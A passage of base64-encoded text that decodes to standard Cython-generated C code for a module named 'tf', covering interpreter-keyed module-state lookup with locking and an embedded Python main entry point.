mg+CnN0YXRpYyBwdGhyZWFkX211dGV4X3QgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfbXV0ZXggPSBQVEhSRUFEX01VVEVYX0lOSVRJQUxJWkVSOwojZGVmaW5lIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX0xvY2soKSBwdGhyZWFkX211dGV4X2xvY2soJl9fUHl4X01vZHVsZVN0YXRlTG9va3VwX211dGV4KQojZGVmaW5lIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX1VubG9jaygpIHB0aHJlYWRfbXV0ZXhfdW5sb2NrKCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9tdXRleCkKI2VsaWYgZGVmaW5lZChfV0lOMzIpCiNpbmNsdWRlIDxXaW5kb3dzLmg+ICAvLyBzeW5jaGFwaS5oIG9uIGl0cyBvd24gZG9lc24ndCB3b3JrCnN0YXRpYyBTUldMT0NLIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX211dGV4ID0gU1JXTE9DS19JTklUOwojZGVmaW5lIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX0xvY2soKSBBY3F1aXJlU1JXTG9ja0V4Y2x1c2l2ZSgmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfbXV0ZXgpCiNkZWZpbmUgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfVW5sb2NrKCkgUmVsZWFzZVNSV0xvY2tFeGNsdXNpdmUoJl9fUHl4X01vZHVsZVN0YXRlTG9va3VwX211dGV4KQojZWxzZQojZXJyb3IgIk5vIHN1aXRhYmxlIGxvY2sgYXZhaWxhYmxlIGZvciBDWVRIT05fTU9EVUxFX1NUQVRFX0xPT0tVUF9USFJFQURfU0FGRS5cCiBSZXF1aXJlcyBDIHN0YW5kYXJkID49IEMxMSwgb3IgQysrIHN0YW5kYXJkID49IEMrKzExLFwKIG9yIHB0aHJlYWRzLCBvciB0aGUgV2luZG93cyAzMiBBUEksIG9yIFB5dGhvbiA+PSAzLjEzLiIKI2VuZGlmCnR5cGVkZWYgc3RydWN0IHsKICAgIGludDY0X3QgaWQ7CiAgICBQeU9iamVjdCAqbW9kdWxlOwp9IF9fUHl4X0ludGVycHJldGVySWRBbmRNb2R1bGU7CnR5cGVkZWYgc3RydWN0IHsKICAgIGNoYXIgaW50ZXJwcmV0ZXJfaWRfYXNfaW5kZXg7CiAgICBQeV9zc2l6ZV90IGNvdW50OwogICAgUHlfc3NpemVfdCBhbGxvY2F0ZWQ7CiAgICBfX1B5eF9JbnRlcnByZXRlcklkQW5kTW9kdWxlIHRhYmxlWzFdOwp9IF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YTsKI2RlZmluZSBfX1BZWF9NT0RVTEVfU1RBVEVfTE9PS1VQX1NNQUxMX1NJWkUgMzIKI2lmIENZVEhPTl9NT0RVTEVfU1RBVEVfTE9PS1VQX1RIUkVBRF9TQUZFCnN0YXRpYyBfX3B5eF9hdG9taWNfaW50X3R5cGUgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfcmVhZF9jb3VudGVyID0gMDsKI2VuZGlmCiNpZiBDWVRIT05fTU9EVUxFX1NUQVRFX0xPT0tVUF9USFJFQURfU0FGRQpzdGF0aWMgX19weXhfYXRvbWljX3B0cl90eXBlIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX2RhdGEgPSAwOwojZWxzZQpzdGF0aWMgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhKiBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9kYXRhID0gTlVMTDsKI2VuZGlmCnN0YXRpYyBfX1B5eF9JbnRlcnByZXRlcklkQW5kTW9kdWxlKiBfX1B5eF9TdGF0ZV9GaW5kTW9kdWxlU3RhdGVMb29rdXBUYWJsZUxvd2VyQm91bmQoCiAgICAgICAgX19QeXhfSW50ZXJwcmV0ZXJJZEFuZE1vZHVsZSogdGFibGUsCiAgICAgICAgUHlfc3NpemVfdCBjb3VudCwKICAgICAgICBpbnQ2NF90IGludGVycHJldGVySWQpIHsKICAgIF9fUHl4X0ludGVycHJldGVySWRBbmRNb2R1bGUqIGJlZ2luID0gdGFibGU7CiAgICBfX1B5eF9JbnRlcnByZXRlcklkQW5kTW9kdWxlKiBlbmQgPSBiZWdpbiArIGNvdW50OwogICAgaWYgKGJlZ2luLT5pZCA9PSBpbnRlcnByZXRlcklkKSB7CiAgICAgICAgcmV0dXJuIGJlZ2luOwogICAgfQogICAgd2hpbGUgKChlbmQgLSBiZWdpbikgPiBfX1BZWF9NT0RVTEVfU1RBVEVfTE9PS1VQX1NNQUxMX1NJWkUpIHsKICAgICAgICBfX1B5eF9JbnRlcnByZXRlcklkQW5kTW9kdWxlKiBoYWxmd2F5ID0gYmVnaW4gKyAoZW5kIC0gYmVnaW4pLzI7CiAgICAgICAgaWYgKGhhbGZ3YXktPmlkID09IGludGVycHJldGVySWQpIHsKICAgICAgICAgICAgcmV0dXJuIGhhbGZ3YXk7CiAgICAgICAgfQogICAgICAgIGlmIChoYWxmd2F5LT5pZCA8IGludGVycHJldGVySWQpIHsKICAgICAgICAgICAgYmVnaW4gPSBoYWxmd2F5OwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGVuZCA9IGhhbGZ3YXk7CiAgICAgICAgfQogICAgfQogICAgZm9yICg7IGJlZ2luIDwgZW5kOyArK2JlZ2luKSB7CiAgICAgICAgaWYgKGJlZ2luLT5pZCA+PSBpbnRlcnByZXRlcklkKSByZXR1cm4gYmVnaW47CiAgICB9CiAgICByZXR1cm4gYmVnaW47Cn0Kc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9TdGF0ZV9GaW5kTW9kdWxlKENZVEhPTl9VTlVTRUQgdm9pZCogZHVtbXkpIHsKICAgIGludDY0X3QgaW50ZXJwcmV0ZXJfaWQgPSBQeUludGVycHJldGVyU3RhdGVfR2V0SUQoX19QeXhfUHlJbnRlcnByZXRlclN0YXRlX0dldCgpKTsKICAgIGlmIChpbnRlcnByZXRlcl9pZCA9PSAtMSkgcmV0dXJuIE5VTEw7CiNpZiBDWVRIT05fTU9EVUxFX1NUQVRFX0xPT0tVUF9USFJFQURfU0FGRQogICAgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhKiBkYXRhID0gKF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSopX19weXhfYXRvbWljX3BvaW50ZXJfbG9hZF9yZWxheGVkKCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9kYXRhKTsKICAgIHsKICAgICAgICBfX3B5eF9hdG9taWNfaW5jcl9hY3FfcmVsKCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9yZWFkX2NvdW50ZXIpOwogICAgICAgIGlmIChsaWtlbHkoZGF0YSkpIHsKICAgICAgICAgICAgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhKiBuZXdfZGF0YSA9IChfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEqKV9fcHl4X2F0b21pY19wb2ludGVyX2xvYWRfYWNxdWlyZSgmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfZGF0YSk7CiAgICAgICAgICAgIGlmIChsaWtlbHkoZGF0YSA9PSBuZXdfZGF0YSkpIHsKICAgICAgICAgICAgICAgIGdvdG8gcmVhZF9maW5pc2hlZDsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBfX3B5eF9hdG9taWNfZGVjcl9hY3FfcmVsKCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9yZWFkX2NvdW50ZXIpOwogICAgICAgIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX0xvY2soKTsKICAgICAgICBfX3B5eF9hdG9taWNfaW5jcl9yZWxheGVkKCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9yZWFkX2NvdW50ZXIpOwogICAgICAgIGRhdGEgPSAoX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhKilfX3B5eF9hdG9taWNfcG9pbnRlcl9sb2FkX3JlbGF4ZWQoJl9fUHl4X01vZHVsZVN0YXRlTG9va3VwX2RhdGEpOwogICAgICAgIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX1VubG9jaygpOwogICAgfQogIHJlYWRfZmluaXNoZWQ6OwojZWxzZQogICAgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhKiBkYXRhID0gX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfZGF0YTsKI2VuZGlmCiAgICBfX1B5eF9JbnRlcnByZXRlcklkQW5kTW9kdWxlKiBmb3VuZCA9IE5VTEw7CiAgICBpZiAodW5saWtlbHkoIWRhdGEpKSBnb3RvIGVuZDsKICAgIGlmIChkYXRhLT5pbnRlcnByZXRlcl9pZF9hc19pbmRleCkgewogICAgICAgIGlmIChpbnRlcnByZXRlcl9pZCA8IGRhdGEtPmNvdW50KSB7CiAgICAgICAgICAgIGZvdW5kID0gZGF0YS0+dGFibGUraW50ZXJwcmV0ZXJfaWQ7CiAgICAgICAgfQogICAgfSBlbHNlIHsKICAgICAgICBmb3VuZCA9IF9fUHl4X1N0YXRlX0ZpbmRNb2R1bGVTdGF0ZUxvb2t1cFRhYmxlTG93ZXJCb3VuZCgKICAgICAgICAgICAgZGF0YS0+dGFibGUsIGRhdGEtPmNvdW50LCBpbnRlcnByZXRlcl9pZCk7CiAgICB9CiAgZW5kOgogICAgewogICAgICAgIFB5T2JqZWN0ICpyZXN1bHQ9TlVMTDsKICAgICAgICBpZiAoZm91bmQgJiYgZm91bmQtPmlkID09IGludGVycHJldGVyX2lkKSB7CiAgICAgICAgICAgIHJlc3VsdCA9IGZvdW5kLT5tb2R1bGU7CiAgICAgICAgfQojaWYgQ1lUSE9OX01PRFVMRV9TVEFURV9MT09LVVBfVEhSRUFEX1NBRkUKICAgICAgICBfX3B5eF9hdG9taWNfZGVjcl9hY3FfcmVsKCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9yZWFkX2NvdW50ZXIpOwojZW5kaWYKICAgICAgICByZXR1cm4gcmVzdWx0OwogICAgfQp9CiNpZiBDWVRIT05fTU9EVUxFX1NUQVRFX0xPT0tVUF9USFJFQURfU0FGRQpzdGF0aWMgdm9pZCBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF93YWl0X3VudGlsX25vX3JlYWRlcnModm9pZCkgewogICAgd2hpbGUgKF9fcHl4X2F0b21pY19sb2FkKCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9yZWFkX2NvdW50ZXIpICE9IDApOwp9CiNlbHNlCiNkZWZpbmUgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfd2FpdF91bnRpbF9ub19yZWFkZXJzKCkKI2VuZGlmCnN0YXRpYyBpbnQgX19QeXhfU3RhdGVfQWRkTW9kdWxlSW50ZXJwSWRBc0luZGV4KF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSAqKm9sZF9kYXRhLCBQeU9iamVjdCogbW9kdWxlLCBpbnQ2NF90IGludGVycHJldGVyX2lkKSB7CiAgICBQeV9zc2l6ZV90IHRvX2FsbG9jYXRlID0gKCpvbGRfZGF0YSktPmFsbG9jYXRlZDsKICAgIHdoaWxlICh0b19hbGxvY2F0ZSA8PSBpbnRlcnByZXRlcl9pZCkgewogICAgICAgIGlmICh0b19hbGxvY2F0ZSA9PSAwKSB0b19hbGxvY2F0ZSA9IDE7CiAgICAgICAgZWxzZSB0b19hbGxvY2F0ZSAqPSAyOwogICAgfQogICAgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhICpuZXdfZGF0YSA9ICpvbGRfZGF0YTsKICAgIGlmICh0b19hbGxvY2F0ZSAhPSAoKm9sZF9kYXRhKS0+YWxsb2NhdGVkKSB7CiAgICAgICAgIG5ld19kYXRhID0gKF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSAqKXJlYWxsb2MoCiAgICAgICAgICAgICpvbGRfZGF0YSwKICAgICAgICAgICAgc2l6ZW9mKF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSkrKHRvX2FsbG9jYXRlLTEpKnNpemVvZihfX1B5eF9JbnRlcnByZXRlcklkQW5kTW9kdWxlKSk7CiAgICAgICAgaWYgKCFuZXdfZGF0YSkgewogICAgICAgICAgICBQeUVycl9Ob01lbW9yeSgpOwogICAgICAgICAgICByZXR1cm4gLTE7CiAgICAgICAgfQogICAgICAgIGZvciAoUHlfc3NpemVfdCBpID0gbmV3X2RhdGEtPmFsbG9jYXRlZDsgaSA8IHRvX2FsbG9jYXRlOyArK2kpIHsKICAgICAgICAgICAgbmV3X2RhdGEtPnRhYmxlW2ldLmlkID0gaTsKICAgICAgICAgICAgbmV3X2RhdGEtPnRhYmxlW2ldLm1vZHVsZSA9IE5VTEw7CiAgICAgICAgfQogICAgICAgIG5ld19kYXRhLT5hbGxvY2F0ZWQgPSB0b19hbGxvY2F0ZTsKICAgIH0KICAgIG5ld19kYXRhLT50YWJsZVtpbnRlcnByZXRlcl9pZF0ubW9kdWxlID0gbW9kdWxlOwogICAgaWYgKG5ld19kYXRhLT5jb3VudCA8IGludGVycHJldGVyX2lkKzEpIHsKICAgICAgICBuZXdfZGF0YS0+Y291bnQgPSBpbnRlcnByZXRlcl9pZCsxOwogICAgfQogICAgKm9sZF9kYXRhID0gbmV3X2RhdGE7CiAgICByZXR1cm4gMDsKfQpzdGF0aWMgdm9pZCBfX1B5eF9TdGF0ZV9Db252ZXJ0RnJvbUludGVycElkQXNJbmRleChfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEgKmRhdGEpIHsKICAgIF9fUHl4X0ludGVycHJldGVySWRBbmRNb2R1bGUgKnJlYWQgPSBkYXRhLT50YWJsZTsKICAgIF9fUHl4X0ludGVycHJldGVySWRBbmRNb2R1bGUgKndyaXRlID0gZGF0YS0+dGFibGU7CiAgICBfX1B5eF9JbnRlcnByZXRlcklkQW5kTW9kdWxlICplbmQgPSByZWFkICsgZGF0YS0+Y291bnQ7CiAgICBmb3IgKDsgcmVhZDxlbmQ7ICsrcmVhZCkgewogICAgICAgIGlmIChyZWFkLT5tb2R1bGUpIHsKICAgICAgICAgICAgd3JpdGUtPmlkID0gcmVhZC0+aWQ7CiAgICAgICAgICAgIHdyaXRlLT5tb2R1bGUgPSByZWFkLT5tb2R1bGU7CiAgICAgICAgICAgICsrd3JpdGU7CiAgICAgICAgfQogICAgfQogICAgZGF0YS0+Y291bnQgPSB3cml0ZSAtIGRhdGEtPnRhYmxlOwogICAgZm9yICg7IHdyaXRlPGVuZDsgKyt3cml0ZSkgewogICAgICAgIHdyaXRlLT5pZCA9IDA7CiAgICAgICAgd3JpdGUtPm1vZHVsZSA9IE5VTEw7CiAgICB9CiAgICBkYXRhLT5pbnRlcnByZXRlcl9pZF9hc19pbmRleCA9IDA7Cn0Kc3RhdGljIGludCBfX1B5eF9TdGF0ZV9BZGRNb2R1bGUoUHlPYmplY3QqIG1vZHVsZSwgQ1lUSE9OX1VOVVNFRCB2b2lkKiBkdW1teSkgewogICAgaW50NjRfdCBpbnRlcnByZXRlcl9pZCA9IFB5SW50ZXJwcmV0ZXJTdGF0ZV9HZXRJRChfX1B5eF9QeUludGVycHJldGVyU3RhdGVfR2V0KCkpOwogICAgaWYgKGludGVycHJldGVyX2lkID09IC0xKSByZXR1cm4gLTE7CiAgICBpbnQgcmVzdWx0ID0gMDsKICAgIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX0xvY2soKTsKI2lmIENZVEhPTl9NT0RVTEVfU1RBVEVfTE9PS1VQX1RIUkVBRF9TQUZFCiAgICBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEgKm9sZF9kYXRhID0gKF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSAqKQogICAgICAgICAgICBfX3B5eF9hdG9taWNfcG9pbnRlcl9leGNoYW5nZSgmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfZGF0YSwgMCk7CiNlbHNlCiAgICBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEgKm9sZF9kYXRhID0gX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfZGF0YTsKI2VuZGlmCiAgICBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEgKm5ld19kYXRhID0gb2xkX2RhdGE7CiAgICBpZiAoIW5ld19kYXRhKSB7CiAgICAgICAgbmV3X2RhdGEgPSAoX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhICopY2FsbG9jKDEsIHNpemVvZihfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEpKTsKICAgICAgICBpZiAoIW5ld19kYXRhKSB7CiAgICAgICAgICAgIHJlc3VsdCA9IC0xOwogICAgICAgICAgICBQeUVycl9Ob01lbW9yeSgpOwogICAgICAgICAgICBnb3RvIGVuZDsKICAgICAgICB9CiAgICAgICAgbmV3X2RhdGEtPmFsbG9jYXRlZCA9IDE7CiAgICAgICAgbmV3X2RhdGEtPmludGVycHJldGVyX2lkX2FzX2luZGV4ID0gMTsKICAgIH0KICAgIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX3dhaXRfdW50aWxfbm9fcmVhZGVycygpOwogICAgaWYgKG5ld19kYXRhLT5pbnRlcnByZXRlcl9pZF9hc19pbmRleCkgewogICAgICAgIGlmIChpbnRlcnByZXRlcl9pZCA8IF9fUFlYX01PRFVMRV9TVEFURV9MT09LVVBfU01BTExfU0laRSkgewogICAgICAgICAgICByZXN1bHQgPSBfX1B5eF9TdGF0ZV9BZGRNb2R1bGVJbnRlcnBJZEFzSW5kZXgoJm5ld19kYXRhLCBtb2R1bGUsIGludGVycHJldGVyX2lkKTsKICAgICAgICAgICAgZ290byBlbmQ7CiAgICAgICAgfQogICAgICAgIF9fUHl4X1N0YXRlX0NvbnZlcnRGcm9tSW50ZXJwSWRBc0luZGV4KG5ld19kYXRhKTsKICAgIH0KICAgIHsKICAgICAgICBQeV9zc2l6ZV90IGluc2VydF9hdCA9IDA7CiAgICAgICAgewogICAgICAgICAgICBfX1B5eF9JbnRlcnByZXRlcklkQW5kTW9kdWxlKiBsb3dlcl9ib3VuZCA9IF9fUHl4X1N0YXRlX0ZpbmRNb2R1bGVTdGF0ZUxvb2t1cFRhYmxlTG93ZXJCb3VuZCgKICAgICAgICAgICAgICAgIG5ld19kYXRhLT50YWJsZSwgbmV3X2RhdGEtPmNvdW50LCBpbnRlcnByZXRlcl9pZCk7CiAgICAgICAgICAgIGFzc2VydChsb3dlcl9ib3VuZCk7CiAgICAgICAgICAgIGluc2VydF9hdCA9IGxvd2VyX2JvdW5kIC0gbmV3X2RhdGEtPnRhYmxlOwogICAgICAgICAgICBpZiAodW5saWtlbHkoaW5zZXJ0X2F0IDwgbmV3X2RhdGEtPmNvdW50ICYmIGxvd2VyX2JvdW5kLT5pZCA9PSBpbnRlcnByZXRlcl9pZCkpIHsKICAgICAgICAgICAgICAgIGxvd2VyX2JvdW5kLT5tb2R1bGUgPSBtb2R1bGU7CiAgICAgICAgICAgICAgICBnb3RvIGVuZDsgIC8vIGFscmVhZHkgaW4gdGFibGUsIG5vdGhpbmcgbW9yZSB0byBkbwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGlmIChuZXdfZGF0YS0+Y291bnQrMSA+PSBuZXdfZGF0YS0+YWxsb2NhdGVkKSB7CiAgICAgICAgICAgIFB5X3NzaXplX3QgdG9fYWxsb2NhdGUgPSAobmV3X2RhdGEtPmNvdW50KzEpKjI7CiAgICAgICAgICAgIG5ld19kYXRhID0KICAgICAgICAgICAgICAgIChfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEqKXJlYWxsb2MoCiAgICAgICAgICAgICAgICAgICAgbmV3X2RhdGEsCiAgICAgICAgICAgICAgICAgICAgc2l6ZW9mKF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSkgKwogICAgICAgICAgICAgICAgICAgICh0b19hbGxvY2F0ZS0xKSpzaXplb2YoX19QeXhfSW50ZXJwcmV0ZXJJZEFuZE1vZHVsZSkpOwogICAgICAgICAgICBpZiAoIW5ld19kYXRhKSB7CiAgICAgICAgICAgICAgICByZXN1bHQgPSAtMTsKICAgICAgICAgICAgICAgIG5ld19kYXRhID0gb2xkX2RhdGE7CiAgICAgICAgICAgICAgICBQeUVycl9Ob01lbW9yeSgpOwogICAgICAgICAgICAgICAgZ290byBlbmQ7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgbmV3X2RhdGEtPmFsbG9jYXRlZCA9IHRvX2FsbG9jYXRlOwogICAgICAgIH0KICAgICAgICArK25ld19kYXRhLT5jb3VudDsKICAgICAgICBpbnQ2NF90IGxhc3RfaWQgPSBpbnRlcnByZXRlcl9pZDsKICAgICAgICBQeU9iamVjdCAqbGFzdF9tb2R1bGUgPSBtb2R1bGU7CiAgICAgICAgZm9yIChQeV9zc2l6ZV90IGk9aW5zZXJ0X2F0OyBpPG5ld19kYXRhLT5jb3VudDsgKytpKSB7CiAgICAgICAgICAgIGludDY0X3QgY3VycmVudF9pZCA9IG5ld19kYXRhLT50YWJsZVtpXS5pZDsKICAgICAgICAgICAgbmV3X2RhdGEtPnRhYmxlW2ldLmlkID0gbGFzdF9pZDsKICAgICAgICAgICAgbGFzdF9pZCA9IGN1cnJlbnRfaWQ7CiAgICAgICAgICAgIFB5T2JqZWN0ICpjdXJyZW50X21vZHVsZSA9IG5ld19kYXRhLT50YWJsZVtpXS5tb2R1bGU7CiAgICAgICAgICAgIG5ld19kYXRhLT50YWJsZVtpXS5tb2R1bGUgPSBsYXN0X21vZHVsZTsKICAgICAgICAgICAgbGFzdF9tb2R1bGUgPSBjdXJyZW50X21vZHVsZTsKICAgICAgICB9CiAgICB9CiAgZW5kOgojaWYgQ1lUSE9OX01PRFVMRV9TVEFURV9MT09LVVBfVEhSRUFEX1NBRkUKICAgIF9fcHl4X2F0b21pY19wb2ludGVyX2V4Y2hhbmdlKCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9kYXRhLCBuZXdfZGF0YSk7CiNlbHNlCiAgICBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9kYXRhID0gbmV3X2RhdGE7CiNlbmRpZgogICAgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfVW5sb2NrKCk7CiAgICByZXR1cm4gcmVzdWx0Owp9CnN0YXRpYyBpbnQgX19QeXhfU3RhdGVfUmVtb3ZlTW9kdWxlKENZVEhPTl9VTlVTRUQgdm9pZCogZHVtbXkpIHsKICAgIGludDY0X3QgaW50ZXJwcmV0ZXJfaWQgPSBQeUludGVycHJldGVyU3RhdGVfR2V0SUQoX19QeXhfUHlJbnRlcnByZXRlclN0YXRlX0dldCgpKTsKICAgIGlmIChpbnRlcnByZXRlcl9pZCA9PSAtMSkgcmV0dXJuIC0xOwogICAgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfTG9jaygpOwojaWYgQ1lUSE9OX01PRFVMRV9TVEFURV9MT09LVVBfVEhSRUFEX1NBRkUKICAgIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSAqZGF0YSA9IChfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEgKikKICAgICAgICAgICAgX19weXhfYXRvbWljX3BvaW50ZXJfZXhjaGFuZ2UoJl9fUHl4X01vZHVsZVN0YXRlTG9va3VwX2RhdGEsIDApOwojZWxzZQogICAgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhICpkYXRhID0gX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfZGF0YTsKI2VuZGlmCiAgICBpZiAoZGF0YS0+aW50ZXJwcmV0ZXJfaWRfYXNfaW5kZXgpIHsKICAgICAgICBpZiAoaW50ZXJwcmV0ZXJfaWQgPCBkYXRhLT5jb3VudCkgewogICAgICAgICAgICBkYXRhLT50YWJsZVtpbnRlcnByZXRlcl9pZF0ubW9kdWxlID0gTlVMTDsKICAgICAgICB9CiAgICAgICAgZ290byBkb25lOwogICAgfQogICAgewogICAgICAgIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX3dhaXRfdW50aWxfbm9fcmVhZGVycygpOwogICAgICAgIF9fUHl4X0ludGVycHJldGVySWRBbmRNb2R1bGUqIGxvd2VyX2JvdW5kID0gX19QeXhfU3RhdGVfRmluZE1vZHVsZVN0YXRlTG9va3VwVGFibGVMb3dlckJvdW5kKAogICAgICAgICAgICBkYXRhLT50YWJsZSwgZGF0YS0+Y291bnQsIGludGVycHJldGVyX2lkKTsKICAgICAgICBpZiAoIWxvd2VyX2JvdW5kKSBnb3RvIGRvbmU7CiAgICAgICAgaWYgKGxvd2VyX2JvdW5kLT5pZCAhPSBpbnRlcnByZXRlcl9pZCkgZ290byBkb25lOwogICAgICAgIF9fUHl4X0ludGVycHJldGVySWRBbmRNb2R1bGUgKmVuZCA9IGRhdGEtPnRhYmxlK2RhdGEtPmNvdW50OwogICAgICAgIGZvciAoO2xvd2VyX2JvdW5kPGVuZC0xOyArK2xvd2VyX2JvdW5kKSB7CiAgICAgICAgICAgIGxvd2VyX2JvdW5kLT5pZCA9IChsb3dlcl9ib3VuZCsxKS0+aWQ7CiAgICAgICAgICAgIGxvd2VyX2JvdW5kLT5tb2R1bGUgPSAobG93ZXJfYm91bmQrMSktPm1vZHVsZTsKICAgICAgICB9CiAgICB9CiAgICAtLWRhdGEtPmNvdW50OwogICAgaWYgKGRhdGEtPmNvdW50ID09IDApIHsKICAgICAgICBmcmVlKGRhdGEpOwogICAgICAgIGRhdGEgPSBOVUxMOwogICAgfQogIGRvbmU6CiNpZiBDWVRIT05fTU9EVUxFX1NUQVRFX0xPT0tVUF9USFJFQURfU0FGRQogICAgX19weXhfYXRvbWljX3BvaW50ZXJfZXhjaGFuZ2UoJl9fUHl4X01vZHVsZVN0YXRlTG9va3VwX2RhdGEsIGRhdGEpOwojZWxzZQogICAgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfZGF0YSA9IGRhdGE7CiNlbmRpZgogICAgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfVW5sb2NrKCk7CiAgICByZXR1cm4gMDsKfQojZW5kaWYKCgojaWZkZWYgX01TQ19WRVIKI3ByYWdtYSB3YXJuaW5nKCBwb3AgKQojZW5kaWYKCgoKCiNlbmRpZiAKCiNpZmRlZiBfX0ZyZWVCU0RfXwojaW5jbHVkZSA8ZGVkZS5oPgojZW5kaWYKI2lmIFBZX01BSk9SX1ZFUlNJT04gPCAzCmludCBtYWluKGludCBhcmdjLCBjaGFyKiogYXJndikgewojZWxpZiBkZWZpbmVkKFdpbjMyKSB8fCBkZWZpbmVkKE1TX1dJTkRPV1MpCmludCB3bWFpbihpbnQgYXJnYywgd2NoYXJfdCAqKmFyZ3YpIHsKI2Vsc2UKc3RhdGljIGludCBfX1B5eF9tYWluKGludCBhcmdjLCB3Y2hhcl90ICoqYXJndikgewojZW5kaWYKI2lmZGVmIF9fRnJlZUJTRF9fCiAgICBmcF9leGNlcHRfdCBtOwogICAgbSA9IGZwZ2V0bWFzaygpOwogICAgZnBzZXRtYXNrKG0gJiB+RlBfWF9PRkwpOwojZW5kaWYKICAgIGlmIChhcmdjICYmIGFyZ3YpCiAgICAgICAgUHlfU2V0UHJvZ3JhbU5hbWUoYXJndlswXSk7CiAgICBQeV9Jbml0aWFsaXplKCk7CiAgICBpZiAoYXJnYyAmJiBhcmd2KQogICAgICAgIFB5U3lzX1NldEFyZ3YoYXJnYywgYXJndik7CiAgICB7CiAgICAgIFB5T2JqZWN0KiBtID0gTlVMTDsKICAgICAgX19weXhfbW9kdWxlX2lzX21haW5fdGYgPSAxOwogICAgICAjaWYgUFlfTUFKT1JfVkVSU0lPTiA8IDMKICAgICAgICAgIGluaXR0ZigpOwogICAgICAjZWxpZiBDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVQKICAgICAgICAgIG0gPSBQeUluaXRfdGYoKTsKICAgICAgICAgIGlmICghUHlNb2R1bGVfQ2hlY2sobSkpIHsKICAgICAgICAgICAgICBQeU1vZHVsZURlZiAqbWRlZiA9IChQeU1vZHVsZURlZiAqKSBtOwogICAgICAgICAgICAgIFB5T2JqZWN0ICptb2RuYW1lID0gUHlVbmljb2RlX0Zyb21TdHJpbmcoIl9fbWFpbl9fIik7CiAgICAgICAgICAgICAgbSA9IE5VTEw7CiAgICAgICAgICAgICAgaWYgKG1vZG5hbWUpIHsKICAgICAgICAgICAgICAgICAgbSA9IFB5TW9kdWxlX05ld09iamVjdChtb2RuYW1lKTsKICAgICAgICAgICAgICAgICAgUHlfREVDUkVGKG1vZG5hbWUpOwogICAgICAgICAgICAgICAgICBpZiAobSkgUHlNb2R1bGVfRXhlY0RlZihtLCBtZGVmKTsKICAgICAgICAgICAgICB9CiAgICAgICAgICB9CiAgICAgICNlbHNlCiAgICAgICAgICBtID0gUHlJbml0X3RmKCk7CiAgICAgICNlbmRpZgogICAgICBpZiAoUHlFcnJfT2NjdXJyZWQoKSkgewogICAgICAgICAgUHlFcnJfUHJpbnQoKTsKICAgICAgICAgICNpZiBQWV9NQUpPUl9WRVJTSU9OIDwgMwogICAgICAgICAgaWYgKFB5X0ZsdXNoTGluZSgpKSBQeUVycl9DbGVhcigpOwogICAgICAgICAgI2VuZGlmCiAgICAgICAgICByZXR1cm4gMTsKICAgICAgfQogICAgICBQeV9YREVDUkVGKG0pOwogICAgfQojaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMDYwMDAwCiAgICBQeV9GaW5hbGl6ZSgpOwojZWxzZQog